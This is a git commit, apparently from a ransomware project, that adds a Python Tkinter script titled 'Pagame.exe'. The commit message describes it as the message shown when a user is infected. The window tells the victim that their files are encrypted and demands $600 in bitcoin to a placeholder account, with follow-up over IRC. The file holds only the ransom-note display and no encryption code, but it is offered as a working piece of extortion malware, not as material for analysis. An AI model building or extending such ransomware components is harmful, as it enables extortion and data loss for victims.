662e4ba69404c16c7978e14054092d7c21abbc49
sk8abraham <sk8abraham24@gmail.com>
2019-05-26 03:06:24 -0500

    Mensaje a mostrar cuando un usuario es infectado

---
+++ mensaje.py
@@ -0,0 +1,8 @@
+from Tkinter import *
+
+raiz=Tk()
+raiz.title("Pagame.exe")
+raiz.geometry("500x150+500+150")
+etiqueta=Label(raiz,text="\nHaz sido infectado, algunos de tus archivos se encuentran cifrados,\n si quieres recuperarlos tienes que pagar lo equivalente a $600 USD\n en bitcoins a la cuenta: qwerty123456. \n\nSi ya pagaste contactame por el canal IRC y te dire lo que procede ;)")
+etiqueta.pack()
+raiz.mainloop()
